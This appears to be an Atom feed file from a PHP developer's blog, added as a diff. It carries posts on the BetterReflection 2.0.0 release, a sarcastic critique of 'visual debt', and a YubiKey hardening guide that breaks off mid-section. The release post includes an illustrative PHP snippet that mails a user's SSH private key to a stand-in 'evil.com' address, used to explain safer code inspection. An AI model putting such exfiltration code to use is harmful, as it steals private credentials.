@@ -1,0 +1,3175 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[]]></title>
+  <link href="https://ocramius.github.io/atom.xml" rel="self"/>
+  <link href="https://ocramius.github.io/"/>
+  <updated>2017-09-18T23:18:30+02:00</updated>
+  <id>https://ocramius.github.io/</id>
+  <generator uri="http://sculpin.io/">Sculpin</generator>
+  <entry>
+    <title type="html"><![CDATA[BetterReflection version 2.0.0 released]]></title>
+    <link href="https://ocramius.github.io/blog/roave-better-reflection-v2.0"/>
+    <updated>2017-09-18T00:00:00+02:00</updated>
+    <id>https://ocramius.github.io/blog/roave-better-reflection-v2.0</id>
+    <content type="html"><![CDATA[<p>
+        <a href="https://twitter.com/RoaveTeam" target="_blank" rel="fn org">Roave</a>'s
+        <a href="https://github.com/Roave/BetterReflection" target="_blank">BetterReflection</a>
+        <a href="https://github.com/Roave/BetterReflection/releases/tag/2.0.0" target="_blank">2.0.0s</a>
+        was released today!
+      </p>
+
+      <p>
+        I and <a href="http://twitter.com/asgrim" target="_blank">James Titcumb</a> started working on this
+        project back in 2015, and it is a pleasure to see it reaching maturity.
+      </p>
+
+      <p>
+        The initial idea was simple: James would implement all my wicked ideas, while I
+        would lay back and get drunk on Drambuie.
+      </p>
+
+      <p>
+        <img
+          src="../../img/posts/2017-09-18-roave-better-reflection-v2.0.0/drunken-coding.jpg"
+          alt="Me, drunk in bed. Photo by @Asgrim, since I was too drunk to human"
+          />
+      </p>
+
+      <p>
+        Yes, that actually happened. Thank you, James, for all the hard work! 🍻
+      </p>
+
+      <p>
+        <small>(I did some work too, by the way!)</small>
+      </p>
+
+      <h3>What the heck is BetterReflection?</h3>
+
+      <p>
+        Jokes apart, the project is quite ambitious, and it aims at reproducing the entirety of the PHP
+        reflection API without having any actual autoloading being triggered.
+      </p>
+
+      <p>
+        When put in use, it looks like this:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          // src/MyClass.php
+
+          namespace MyProject;
+
+          class MyClass
+          {
+          public function something() {}
+          }
+      </code></pre>
+
+      <pre><code class="php">&lt;?php
+
+          // example1.php
+
+          use MyProject\MyClass;
+          use Roave\BetterReflection\BetterReflection;
+          use Roave\BetterReflection\Reflection\ReflectionMethod;
+
+          require_once __DIR__ . '/vendor/autoload.php';
+
+          $myClass = (new BetterReflection())
+          -&gt;classReflector()
+          -&gt;reflect(MyClass::class);
+
+          $methodNames = \array_map(function (ReflectionMethod $method) : string {
+          return $method-&gt;getName();
+          }, $myClass-&gt;getMethods());
+
+          \var_dump($methodNames);
+
+          // class was not loaded:
+          \var_dump(\sprintf('Class %s loaded: ', MyClass::class));
+          \var_dump(\class_exists(MyClass::class, false));
+      </code></pre>
+
+      <p>
+        As you can see, the difference is just in how you bootstrap the reflection API.
+      </p>
+
+      <p>
+        Also, we do provide a fully backwards-compatible reflection API that you can use
+        if your code heavily relies on <code>ext-reflection</code>:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          // example2.php
+
+          use MyProject\MyClass;
+          use Roave\BetterReflection\BetterReflection;
+          use Roave\BetterReflection\Reflection\Adapter\ReflectionClass;
+
+          require_once __DIR__ . '/vendor/autoload.php';
+
+          $myClass = (new BetterReflection())
+          -&gt;classReflector()
+          -&gt;reflect(MyClass::class);
+
+          $reflectionClass = new ReflectionClass($myClass);
+
+          // You can just use it wherever you had `ReflectionClass`!
+          \var_dump($reflectionClass instanceof \ReflectionClass);
+          \var_dump($reflectionClass-&gt;getName());
+      </code></pre>
+
+      <p>
+        How does that work?
+      </p>
+
+      <p>
+        The operational concept is quite simple, really:
+      </p>
+
+      <ol>
+        <li>
+          We scan your codebase for files matching the one containing your class.
+          This is fully configurable, but by default we use some ugly autoloader
+          hacks to find the file without wasting disk I/O.
+        </li>
+        <li>
+          We feed your PHP file to <a href="https://github.com/nikic/PHP-Parserr" target="_blank">PHP-Parser</a>
+        </li>
+        <li>
+          We analyse the produced <abbr title="Abstract Syntax Tree">AST</abbr> and
+          wrap it in a matching <code>Roave\BetterReflection\Reflection\*</code>
+          class instance, ready for you to consume it.
+        </li>
+      </ol>
+
+      <p>
+        The hard part is tracking the miriad of details of the PHP language,
+        which is very complex and cluttered with scope, visibility and inheritance
+        rules: we take care of it for you.
+      </p>
+
+      <h3>Use case scenarios</h3>
+
+      <p>
+        The main use-cases for BetterReflection are most likely around security, code
+        analysis and <abbr title="Ahead of Time">AOT</abbr> compilation.
+      </p>
+
+      <p>
+        One of the most immediate use-cases will likely be in
+        <a href="https://github.com/phpstan/phpstan" target="_blank">PHPStan</a>, which
+        will finally be able to inspect hideous mixed OOP/functional/procedural code
+        if <a href="https://github.com/phpstan/phpstan/issues/67" target="_blank">
+          the current WIP implementation
+        </a> works as expected.
+      </p>
+
+      <p>
+        Since you can now "work" with code before having loaded it, you can harden API
+        around a lot of security-sensitive contexts. A serializer may decide
+        to not load a class if side-effects are contained in the file declaring it:
+      </p>
+
+      <pre><code class="php">&lt;?php
+
+          // Evil.php
+          \mail(
+          'haxxor@evil.com',
+          'All ur SSH keys are belong to us',
+          \file_get_contents('~/.ssh/id_rsa')
+          );
+
+          // you really don't want to autoload this bad one:
+          class Evil {}
+      </code></pre>
+
+      <p>
+        The same goes for classes implementing malicious <code>__destruct</code> code,
+        as well as classes that may trigger autoloading of other malicious code.
+      </p>
+
+      <p>
+        It is also possible to analyse code that is downloaded from the internet without
+        actually running it. For instance, code may be checked against GPG signatures in
+        the file signature before being run, effectively allowing PHP to "run only signed code".
+        <a href="https://getcomposer.org/" target="_blank">Composer</a>, anybody?
+      </p>
+
+      <p>
+        If you are more into code analysis, you may decide to compare two different
+        versions of a library, and scan for <abbr title="Backwards Compatibility">BC</abbr>
+        breaks:
+      </p>
+
+      <pre><code class="php">&lt;?php
+          // the-library/v1/src/SomeApi.php
+
+          class SomeAPI
+          {
+          public function sillyThings() { /* ... */ }
+          }
+      </code></pre>
+
+      <pre><code class="php">&lt;?php
+          // the-library/v2/src/SomeApi.php
+
+          class SomeAPI
+          {
+          public function sillyThings(UhOh $bcBreak) { /* ... */ }
+          }
+      </code></pre>
+
+      <p>
+        In this scenario, somebody added a mandatory parameter to <code>SomeAPI#sillyThings()</code>,
+        effectively introducing a BC break that is hard to detect without having both versions of the
+        code available, or a good migration documentation (library developers: please document this
+        kind of change!).
+      </p>
+
+      <p>
+        Another way to leverage the power of this factory is to compile factory code into highly 
+        optimised dependency injection containers, like
+        <a href="https://github.com/PHP-DI/PHP-DI/pull/507" target="_blank">PHP-DI</a> started doing.
+      </p>
+
+      <h3>Future use cases?</h3>
+
+      <p>
+        In addition to the above use-case scenarios, we are working on additional
+        functionality that would allow
+        <a href="https://github.com/Roave/BetterReflection/blob/2.0.0/demo/monkey-patching/index.php" target="_blank">
+          changing code before loading it
+        </a>. 
+      </p>
+
+      <p>
+        Is that a good idea?
+      </p>
+
+      <p>
+        ... I honestly don't know.
+      </p>
+
+      <p>
+        Still, there are proper use-case scenarios around
+        <abbr title="Aspect Oriented Programming">AOP</abbr> and proxying libraries,
+        which would then be able to work even with <code>final</code> classes.
+      </p>
+
+      <p>
+        You will likely see these features appear in a new, separate library.
+      </p>
+
+      <h3>Credits</h3>
+
+      <p>
+        To conclude, I would like to thank <a href="https://github.com/asgrim" target="_blank">James Titcumb</a>, 
+        <a href="https://github.com/kukulich" target="_blank">Jaroslav Hanslík</a>,
+        <a href="https://github.com/marcosh" target="_blank">Marco Perone</a> and
+        <a href="https://github.com/POPSuL" target="_blank">Viktor Suprun</a> for the effort they put in this release,
+        providing patches, improvements and overall helping us building something that may become
+        extremely useful in the PHP ecosystem.
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[Eliminating Visual Debt]]></title>
+    <link href="https://ocramius.github.io/blog/eliminating-visual-debt"/>
+    <updated>2017-05-29T00:00:00+02:00</updated>
+    <id>https://ocramius.github.io/blog/eliminating-visual-debt</id>
+    <content type="html"><![CDATA[<p>
+        Today we're talking about <strong>Visual debt</strong> in our code.
+      </p>
+
+      <p>
+        As an introduction, I suggest to watch
+        <a href="https://laracasts.com/series/php-bits/episodes/1" target="_blank">
+          this short tutorial
+        </a>
+        about visual debt by
+        <a href="https://twitter.com/jeffrey_way" target="_blank">@jeffrey_way</a>.
+      </p>
+
+      <p>
+        The concept is simple: let's take the example from Laracasts and re-visit
+        the steps taken to remove visual debt.
+      </p>
+
+      <pre><code class="php">interface EventInterface {
+          public function listen(string $name, callable $handler) : void;
+          public function fire(string $name) : bool;
+          }
+
+          final class Event implements EventInterface {
+          protected $events = [];
+
+          public function listen(string $name, callable $handler) : void
+          {
+          $this-&gt;events[$name][] = $handler;
+          }
+
+          public function fire(string $name) : bool
+          {
+          if (! array_key_exists($name, $this-&gt;events)) {
+          return false;
+          }
+
+          foreach ($this-&gt;events[$name] as $event) {
+          $event();
+          }
+
+          return true;
+          }
+          }
+
+          $event = new Event;
+
+          $event-&gt;listen('subscribed', function () {
+          var_dump('handling it');
+          });
+
+          $event-&gt;listen('subscribed', function () {
+          var_dump('handling it again');
+          });
+
+          $event-&gt;fire('subscribed');
+      </code></pre>
+
+      <p>
+        So far, so good.
+      </p>
+
+      <p>
+        We have an event that obviously fires itself, a concrete
+        implementation and a few subscribers.
+      </p>
+
+      <p>
+        Our code works, but it contains a lot of useless artifacts
+        that do not really influence our ability to make it run.
+      </p>
+
+      <p>
+        These artifacts are also distracting, moving our focus from
+        the runtime to the declarative requirements of the code.
+      </p>
+
+      <p>
+        Let's start removing the bits that aren't needed by starting
+        from the method parameter and return type declarations:
+      </p>
+
+      <pre><code class="php">interface EventInterface {
+          public function listen($name, $handler);
+          public function fire($name);
+          }
+
+          final class Event implements EventInterface {
+          protected $events = [];
+
+          public function listen($name, $handler)
+          {
+          $this-&gt;events[$name][] = $handler;
+          }
+
+          public function fire($name)
+          {
+          if (! array_key_exists($name, $this-&gt;events)) {
+          return false;
+          }
+
+          foreach ($this-&gt;events[$name] as $event) {
+          $event();
+          }
+
+          return true;
+          }
+          }
+      </code></pre>
+
+      <p>
+        Our code is obvious, so the parameters don't need
+        redundant declarations or type checks. Also, we are
+        aware of our own implementation, so the runtime checks
+        are not needed, as the code will work correctly as per
+        manual or end to end testing. A quick read will also
+        provide sufficient proof of correctness.
+      </p>
+
+      <p>
+        Since the code is trivial and we know what we are doing
+        when using it, we can remove also the contract that
+        dictates the intended usage. Let's remove those
+        <code>implements</code> and <code>interface</code> symbols.
+      </p>
+
+      <pre><code class="php">final class Event {
+          protected $events = [];
+
+          public function listen($name, $handler)
+          {
+          $this-&gt;events[$name][] = $handler;
+          }
+
+          public function fire($name)
+          {
+          if (! array_key_exists($name, $this-&gt;events)) {
+          return false;
+          }
+
+          foreach ($this-&gt;events[$name] as $event) {
+          $event();
+          }
+
+          return true;
+          }
+          }
+      </code></pre>
+
+      <p>
+        Removing the contract doesn't change the runtime
+        behavior of our code, which is still technically
+        correct. Consumers will also not need to worry
+        about correctness when they use `Event`, as a
+        quick skim over the implementation will reveal
+        its intended usage.
+      </p>
+
+      <p>
+        Also, since the code imposes no limitations on the
+        consumer, who is responsible for the correctness
+        of any code touching ours, we are not going to limit
+        the usage of inheritance.
+      </p>
+
+      <pre><code class="php">class Event {
+          // ... 
+          }
+      </code></pre>
+
+      <p>
+        That's as far as the video goes, with a note that
+        the point is to "question everything".
+      </p>
+
+      <h2>Bringing it further</h2>
+
+      <p>
+        Jeffrey then pushed this a bit further, saying that
+        best practices don't exist, and people are pretty
+        much copying stale discussions about coding approaches:
+      </p>
+
+      <div data-tweet-id="869265813857075200" class="twitter-tweet"></div>
+
+      <p>
+        According to that, I'm going to question the naming
+        chosen for our code. Since the code is trivial and 
+        understandable at first glance, we don't need to pick
+        meaningful names for variables, methods and classes:
+      </p>
+
+      <pre><code class="php">class A {
+          protected $a = [];
+
+          public function a1($a1, $a2)
+          {
+          $this-&gt;a[$a1][] = $a2;
+          }
+
+          public function a2($a1)
+          {
+          if (! array_key_exists($a1, $this-&gt;a)) {
+          return false;
+          }
+
+          foreach ($this-&gt;a[$a1] as $a) {
+          $a();
+          }
+
+          return true;
+          }
+          }
+      </code></pre>
+
+      <p>
+        This effectively removes our need to look at the
+        code details, making the code shorter and
+        runtime-friendly. We're also saving some space
+        in the PHP engine!
+      </p>
+
+      <p>
+        Effectively, this shows us that
+        there are upsides to this approach, as we move
+        from read overhead to less engine overhead. We also
+        stop obsessing after the details of our <code>Event</code>,
+        as we already previously defined it, so we remember
+        how to use it.
+      </p>
+
+      <p>
+        Since the <code>Event</code> type is not really useful to us,
+        as nothing type-hints against it, we can remove it.
+        Let's move back to dealing with a structure of
+        function pointers:
+      </p>
+
+      <pre><code class="php">function A () {
+          $a = [];
+
+          return [
+          function ($a1, $a2) use (&amp; $a) {
+          $a[$a1][] = $a2;
+          },
+          function ($a1) use (&amp; $a) {
+          if (! array_key_exists($a1, $a)) {
+          return false;
+          }
+
+          foreach ($a[$a1] as $a2) {
+          $a2();
+          }
+
+          return true;
+          },
+          ];
+          }
+
+
+          $a = A();
+
+          $a[0]('subscribed', function () {
+          var_dump('handling it');
+          });
+
+          $a[0]('subscribed', function () {
+          var_dump('handling it again');
+          });
+
+          $a[1]('subscribed');
+      </code></pre>
+
+      <p>
+        This code is equivalent, and doesn't use any
+        particularly fancy structures coming from the PHP
+        language, such as classes. We are working
+        towards reducing the learning and comprehension
+        overhead.
+      </p>
+
+      <h2>Conclusion</h2>
+
+      <div data-tweet-id="869277621904912389" class="twitter-tweet"></div>
+
+      <p>
+        If you haven't noticed before, this entire post
+        is just
+        <a href="https://www.youtube.com/watch?v=82CtZX9gmZ8" target="_blank">
+          sarcasm.
+        </a>
+      </p>
+
+      <p>
+        Please don't do any of what is discussed above, it
+        is a badly crafted oxymoron.
+      </p>
+
+      <p>
+        Please don't accept what Jeffrey says in that video.
+      </p>
+
+      <p>
+        Please do use type systems when they are available,
+        they actually reduce "visual debt" (is it even a thing?),
+        helping you distinguish apples from pies.
+      </p>
+
+      <p>
+        Please do use interfaces, as they reduce clutter,
+        making things easier to follow from a consumer perspective,
+        be it a human or an automated tool.
+      </p>
+
+      <p>
+        This is all you
+        need to understand that <code>Event</code> mumbo-jumbo (which
+        has broken naming, by the way, but this isn't an
+        architecture workshop). Maybe add some API doc:
+      </p>
+
+      <pre><code class="php">interface EventInterface {
+          /**
+          * Attach an additional listener to be fired when calling 
+          * `fire` with `$name`
+          */
+          public function listen(string $name, callable $handler) : void;
+
+          /**
+          * Execute all listeners assigned to `$name`
+          *
+          * @return bool whether any listener was executed
+          */
+          public function fire(string $name) : bool;
+          }
+      </code></pre>
+
+      <p>
+        This is not a really good interface, but it's a clear, simple
+        and readable one. No "visual debt". Somebody reading this will
+        thank you later. Maybe it will be you, next year.
+      </p>
+
+      <p>
+        Please <strong>do</strong> follow best practices.
+        <a href="https://www.youtube.com/watch?v=8d2AtAGJPno" target="_blank">
+          They work.
+          They help you avoiding stupid mistakes.
+        </a>.
+        <a href="http://www.edn.com/design/automotive/4423428/Toyota-s-killer-firmware--Bad-design-and-its-consequences" target="_blank">
+          Bad code can lead to terrible consequences, and you don't know where your code will be used.
+        </a>
+        And yes, I'm picking examples about real-time computing,
+        because that's what makes it to the news.
+        <a href="https://www.owasp.org/index.php/" target="_blank">
+          OWASP
+        </a>
+        knows more about all this.
+      </p>
+
+      <p>
+        Please remember that your job is reading, understanding and thinking
+        before typing, and typing is just a side-effect.
+      </p>
+
+      <p>
+        And please, please, please: remember that most of your time you are
+        not coding for yourself alone. You are coding for your employer, for
+        your team, for your project, for your future self.
+      </p>
+      ]]></content>
+  </entry>
+  <entry>
+    <title type="html"><![CDATA[YubiKey for SSH, Login, 2FA, GPG and Git Signing]]></title>
+    <link href="https://ocramius.github.io/blog/yubikey-for-ssh-gpg-git-and-local-login"/>
+    <updated>2017-04-15T00:00:00+02:00</updated>
+    <id>https://ocramius.github.io/blog/yubikey-for-ssh-gpg-git-and-local-login</id>
+    <content type="html"><![CDATA[<p>
+        I've been using a
+        <a href="https://www.yubico.com/products/yubikey-hardware/yubikey-neo/" target="_blank">
+          YubiKey Neo
+        </a>
+        for a bit over two years now, but its usage was limited to
+        <abbr title="Two Factor Authentication">2FA</abbr>
+        and
+        <abbr title="Universal Two Factor Authentication">U2F</abbr>.
+      </p>
+
+      <p>
+        Last week, I received my new DELL XPS 15 9560, and since I am maintaining
+        some high impact open source projects, I wanted the setup to be well secured.
+      </p>
+
+      <p>
+        In addition to that, I caught a bad flu, and that gave me enough excuses
+        to waste time in figuring things out.
+      </p>
+
+      <p>
+        In this article, I'm going to describe what I did, and how you can reproduce
+        my setup for your own safety as well as the one of people that trust you.
+      </p>
+
+      <h2>Yubi-WHAT?</h2>
+
+      <p>
+        In first place, you should know that I am absolutely not a security expert:
+        all I did was following the online tutorials that I found.
+        I also am not a cryptography expert, and I am constantly dissatisfied with
+        how the crypto community reduces everything into a
+        <abbr title="Three Letter Acronym">TLA</abbr>,
+        making even the simplest things impossible to understand for mere mortals.
+      </p>
+
+      <p>
+        First, let's clarify what a YubiKey is.
+      </p>
+
+      <p>
+        <img
+          src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/yoshi-yubikey.jpg"
+          alt="A YubiKey Neo on a cat"
+          />
+      </p>
+
+      <p>
+        That thing is a YubiKey.
+      </p>
+
+      <p>
+        What does it do?
+      </p>
+
+      <p>
+        It's basically an USB key filled with crypto features.
+        It also is (currently) impossible to make a physical copy of it,
+        and it is not possible to extract information written to it.
+      </p>
+
+      <p>
+        It can:
+      </p>
+
+      <ul>
+        <li>
+          Generate
+          <abbr title="Hash Message Authentication Code">HMAC</abbr>
+          hashes (kinda)
+        </li>
+        <li>
+          Store
+          <abbr title="Gnu Privacy Guard">GPG</abbr>
+          private keys
+        </li>
+        <li>Act as a keyboard that generates time-based passwords</li>
+        <li>Generate 2FA time-based login codes</li>
+      </ul>
+
+      <h2>What do we need?</h2>
+
+      <p>
+        In order to follow this tutorial, you should have at least
+        2 (two) YubiKey Neo or equivalent devices. This means that
+        you will have to spend approximately USD 100: these things
+        are quite expensive. You absolutely need a backup key,
+        because all these security measures may lock you out of
+        your systems if you lose or damage one.
+      </p>
+
+      <p>
+        Our kickass setup will allow us to do a series of cool
+        things related to daily development operations:
+      </p>
+
+      <ul>
+        <li>Two Factor Authentication</li>
+        <li>PAM Authentication (logging into your linux/mac PC)</li>
+        <li>GPG mail and GIT commit signing/encrypting</li>
+        <li><abbr title="Secure Shell">SSH</abbr> Authentication</li>
+      </ul>
+
+      <p>
+        <img
+          src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/yubikey-features.jpg"
+          alt="Covered YubiKey features"
+          />
+      </p>
+
+      <p>
+        I am not going to describe the procedures in detail,
+        but just link them and describe what we are doing, and
+        why.
+      </p>
+
+      <h2>Setting up NFC 2FA</h2>
+
+      <p>
+        Simple NFC-based 2FA with authentication codes will
+        be useful for most readers, even non-technical ones.
+      </p>
+
+      <p>
+        What we are doing is simply seed the YubiKey with
+        Google Authenticator codes, except that we will
+        use the
+        <a href="https://play.google.com/store/apps/details?id=com.yubico.yubioath&hl=en" target="_blank">
+          Yubico Authenticator
+        </a>.
+        This will only work for the "primary" key (the one
+        we will likely bring with us at all times).
+      </p>
+
+      <p>
+        What we will have to do is basically:
+      </p>
+
+      <ol>
+        <li>Install some Yubico utility to manage your Yubikey NEO</li>
+        <li>
+          Plug in your YubiKey and enable
+          <abbr title="One Time Password">OTP</abbr>
+          and U2F
+        </li>
+        <li>Install the Yubico Authenticator</li>
+        <li>Seed your Yubikey with the 2FA code provided by a compatible website</li>
+      </ol>
+
+      <p>
+        The setup steps are described in the official
+        <a href="https://www.yubico.com/support/knowledge-base/categories/articles/how-to-use-your-yubikey-with-authenticator-codes/" target="_blank">
+          Yubico website
+        </a>.
+      </p>
+
+      <p>
+        Once the YubiKey is configured with at least one
+        <a href="https://twofactorauth.org/" target="_blank">
+          website
+        </a>
+        that supports the "Google Authenticator" workflow,
+        we should be able to:
+      </p>
+
+      <ol>
+        <li>Open the Yubico Authenticator</li>
+        <li>Tap the YubiKey against our phone's NFC sensor</li>
+        <li>Use the generated authentication code</li>
+      </ol>
+
+      <p>
+        <img
+          src="/img/posts/2017-04-15-yubikey-for-ssh-gpg-git-and-local-login/2fa-codes.jpg"
+          alt="Example Yubico Authenticator screen"
+          />
+      </p>
+
+      <p>
+        One very nice (and unclear, at first) advantage of
+        having a YubiKey seeded with 2FA codes is that
+        we can now generate 2FA codes on any phone, as long
+        as we have our YubiKey with us.
+      </p>
+
+      <p>
+        I already had to remote-lock and remote-erase a phone
+        in the past, and losing the Google Authenticator settings
+        is not fun. If you handle your YubiKey with care, you
+        shouldn't have that problem anymore.
+      </p>
+
+      <p class="alert alert-success">
+        Also, a YubiKey is water-proof: our 2017 phone probably isn't.
+      </p>
+
+      <h2>Setting up PAM authentication</h2>
+
+      <p class="alert alert-warning">
+        <span class="label label-warning">CAUTION:</span> this procedure
+        can potentially lead us to lose <code>sudo</code>
+        access from our account, as well as lock us out of our computer.
+        I take no responsibility: try it in a
+        <abbr title="Virtual Machine">VM</abbr>
+        first, if you do not feel confident.
+      </p>
+
+      <p>
+        We want to make sure that we can log into our personal
+        computer or workstation only when we are physically sitting
+        at it. This means that we need the YubiKey must be plugged
+        in for a password authentication to succeed.
+      </p>
+
+      <p>
+        Each login prompt, user password prompt or <code>sudo</code>
+        command should require both our account password and our YubiKey.
+      </p>
+
+      <p>
+        What we will have to do is basically:
+      </p>
+
+      <ol>
+        <li>Install <code>libpam-yubico</code></li>
+        <li>
+          Enable some capabilities of our YubiKeys with
+          <code>ykpersonalize</code>
+        </li>
+        <li>
+          Generate an initial challenge file for each YubiKey (you
+          bought at least 2, right?) with
+          <code>ykpamcfg</code>
+        </li>
+        <li>Deploy the generated files in a root-only accessible path</li>
+        <li>
+          <span class="label label-warning">IMPORTANT</span>
+          start a
+          <code>sudo</code>
+          session, and be ready to revert changes from there if things go wrong
+        </li>
+        <li>
+          Configure
+          <abbr title="Pluggable Authentication Modules">PAM</abbr>
+          to also expect a challenge response from a YubiKey (reads:
+          a recognized YubiKey must be plugged in when trying to
+          authenticate)
+        </li>
+      </ol>
+
+      <p>
+        The steps to perform that are
+        <a href="https://developers.yubico.com/yubico-pam/Authentication_Using_Challenge-Response.html" target="_blank">
+          in the official Yubico tutorial
+        </a>.
+      </p>
+
+      <p>
+        If everything is done correctly, every prompt asking for our
+        Linux/Mac account password should fail when no YubiKey is plugged
+        in.
+      </p>
+
+      <p class="alert alert-info">
+        <span class="label label-info">TIP:</span> configure the
+        libpam-yubico integration in debug mode, as we will often
+        have a "WTH?" reaction when authentication isn't working.
+        That may happen if there are communication errors with the
+        YubiKey.
+      </p>
+
+      <p>
+        This setup has the advantage of locking out anyone trying to
+        bruteforce our password, as well as stopping potentially malicious
+        background programs from performing authentication or
+        <code>sudo</code>
+        commands while we aren't watching.
+      </p>
+
+      <p class="alert alert-warning">
+        <span class="label label-warning">CAUTION:</span> the point
+        of this sort of setup is to guarantee that login can only
+        happen with the physical person at the computer. If we want
+        to go to the crapper, we lock lock computer, and bring our
+        YubiKey with us.
+      </p>
+
+      <h2>Setting up GPG</h2>
+
+      <p>
+        This is probably the messiest part of the setup, as a lot of
+        CLI tool usage is required.
+      </p>
+
+      <p>
+        Each YubiKey has the ability to store 3 separate keys for
+        <i>signing</i>, <i>encrypting</i> and <i>authenticating</i>.
+      </p>
+
+      <p>
+        We will therefore create a series of GPG keys:
+      </p>
+
+      <ol>
+        <li>A GPG master key (if we don't already have a GPG key)</li>
+        <li>
+          A sub-key for signing (marked
+          <code>[S]</code>
+          in the gpg interactive console)
+        </li>
+        <li>
+          A sub-key for encrypting (marked
+          <code>[E]</code>
+          in the gpg interactive console)
+        </li>
+        <li>
+          A sub-key for authenticating (marked
+          <code>[A]</code>
+          in the gpg interactive console)
+        </li>
+        <li>
+          Generate these 3 sub-keys for each YubiKey
+          we have (3 keys per YubiKey)
+        </li>
+      </ol>
+
+      <p class="alert alert-warning">
+        <span class="label label-warning">CAUTION:</span> as far as I know,
+        the YubiKey Neo only supports RSA keys up to <code>2048</code> long.
+        Do not use <code>4096</code> for the sub-key length unless we know
+        that the key type supports it.
+      </p>
+
+      <p>
+        After that, we will move the private keys to the YubiKeys
+        with the <code>gpg</code> <code>keytocard</code> command.
+      </p>
+
+      <p class="alert alert-warning">
+        <span class="label label-warning">CAUTION:</span> the
+        <code>keytocard</code> command is destructive. Once we moved
+        a private key to a YubiKey, it is removed from our local
+        machine, and it cannot be recovered. Be sure to only move
+        the correct sub-keys.
+      </p>
+
+      <p class="alert alert-info">
+        <span class="label label-info">NOTE:</span> being unable
+        to recover the private sub-key is precisely the
+        point of using a YubiKey: nobody can steal or misuse that
+        keys, no malicious program can copy it, plus we can use
+        it from any workstation.
+      </p>
+
+      <p>
+        Also, we will need to set a
+        <strong>PIN</strong>
+        and an
+        <strong>admin PIN</strong>.
+           These defaults for these two are respectively
+        <code>123456</code>
+           and
+           <code>12345678</code>.
+        The
+        <strong>PIN</strong>
+        will be needed each time we plug in we YubiKey to use
+        any of the private keys stored in it.
+      </p>
+
+      <p class="alert alert-warning">
+           <span class="label label-warning">CAUTION:</span>
+           we only have
+           <code>3</code>
+        attempts for entering our PIN. Should we fail all
+           attempts, then the YubiKey will be locked, and we
+           will have to move new GPG sub-keys to it before being
+        able to use it again. This prevents
+        bruteforcing after physical theft.
+      </p>
+
+      <p>
+        After our gpg sub-keys and PINs are written to the
+        YubiKeys, let's make a couple of secure backups of our master
+        gpg secret key. Then delete it from the computer  Keep
+        just the public key.
+      </p>
+
+      <p>
+        The master private gpg key should only be used to generate
+        new sub-keys, if needed, or to revoke them, if we lose
+        one or more of our physical devices.
+      </p>
+
+      <p>
+        We should now be able to:
+      </p>
+
+      <ul>
+        <li>
+          Sign messages with the signing key stored in our
+          YubiKey (only if plugged in) and its PIN
+        </li>
+        <li>
+          Verify those messages with the master public key
+        </li>
+        <li>
+          Encrypt messages with the master public key
+        </li>
+        <li>
+          Decrypt messages with the encryption key stored in
+          the YubiKey (only if plugged in) and its PIN
+        </li>
+      </ul>
+
+      <p>
+        The exact procedure to achieve all this is described
+        in detail (with console output and examples) at
+        <a href="https://github.com/drduh/YubiKey-Guide/tree/1ad37577db92726eadde4dc302a6f982ba7e82dc">
+          drduh/YubiKey-Guide
+        </a>.
+      </p>
+
+      <h2>GIT commit signing</h2>
+
+      <p>
+        Now that we can sign messages using the GPG key stored
+        in our YubiKey, usage with GIT becomes trivial:
+      </p>
+
+      <p>
+        <code>git config --global user.signingkey=&lt;yubikey-signing-sub-key-id&gt;</code>
+      </p>
+
+      <p>
+        We will now need to plug in our YubiKey and enter our
+        PIN when signing a tag:
+      </p>
+
+      <p>
+        <code>git tag -s this-is-a-signed-tag -m "foo"</code>
+      </p>
+
+      <p class="alert alert-success">
+        Nobody can release software on our behalf without physical
+        access to our YubiKey, as well as our YubiKey PIN.
+      </p>
+
+      <h2>Signing/Encrypting email messages</h2>
+
+      <p>
+        In order to sign/encrypt emails, we will need to install
+        <a href="https://www.mozilla.org/en-US/thunderbird/" target="_blank">
+          Mozilla Thunderbird
+        </a>
+        and
+        <a href="https://www.enigmail.net/index.php/en/" target="_blank">
+          Enigmail
+        </a>.
+      </p>
+
+      <p>
+        The setup will crash a few times. I suggest going through the
+        "advanced" settings, then actually selecting a signing/encryption
+        key when trying to send a signed/encrypted message. Enigmail
+        expects the key to be a file or similar, but this approach
+        will allow us to just give it the private GPG key identifier.
+      </p>
+
+      <p>
+        Sending mails is still a bit buggy: Thunderbird will ask for the
+        pin 3 times, as if it failed to authenticate, but the third attempt
+        will actually succeed. This behavior will be present in a number of
+        prompts, not just within Thunderbird.
+      </p>
+
+      <p class="alert alert-success">
+        <span class="label label-success">!</span>
+        Nobody can read our encrypted emails, unless the YubiKey
+        is plugged in. If our laptop is stolen, these secrets will be
+        protected.
+      </p>
+
+      <h2>SSH authentication</h2>
+
+      <p>
+        There is one GPG key that we didn't use yet:
+        the authentication one.
+      </p>
+
+      <p>
+        There is a (relatively) recent functionality of
+        <code>gpg-agent</code>
+        that allows it to behave as an
+        <code>ssh-agent</code>.
+      </p>
+
+      <p>
+        To make that work, we will simply kill all existing
+        SSH and GPG agents:
+      </p>
+
+      <pre><code class="sh">sudo killall gpg-agent
+          sudo killall ssh-agent
+          # note: eval is used because the produced STDOUT is a bunch of ENV settings
+          eval $( gpg-agent --daemon --enable-ssh-support )
+      </code></pre>
+
+      <p>
+        Once we've done that, let's try running:
+      </p>
+
+      <p>
+        <code>ssh-add -L</code>
+      </p>
+
+      <p>
+        Assuming we don't have any local SSH keys, the output
+        should be something like:
+      </p>
+
+      <pre><code>ocramius@ocramius-XPS-15-9560:~$ ssh-add -L
+          The agent has no identities.
+      </code></pre>
+
+      <p>
+        If we plug in our YubiKey and try again,
+        the output will be:
+      </p>
+
+      <pre><code>ocramius@ocramius-XPS-15-9560:~$ ssh-add -L
+          ssh-rsa AAAAB3NzaC ... pdqtlwX6m1 cardno:000123457915
+      </code></pre>
+
+      <p>
+        MAGIC! <code>gpg-agent</code> is exposing the public GPG key as
+        an SSH key.
+      </p>
+
+      <p>
+        If we upload this public key to a server, and then
+        try logging in with the YubiKey plugged in, we will
+        be asked for the YubiKey PIN, and will then just be able
+        to log in as usual.
+      </p>
+
+      <p class="alert alert-success">
+        Nobody can log into our remote servers without having
+        the physical key device.
+      </p>
+
+      <p class="alert alert-success">
+        We can log into our remote servers from any computer
+        that can run gpg-agent. Just always bring our YubiKey with
+        ourselves.
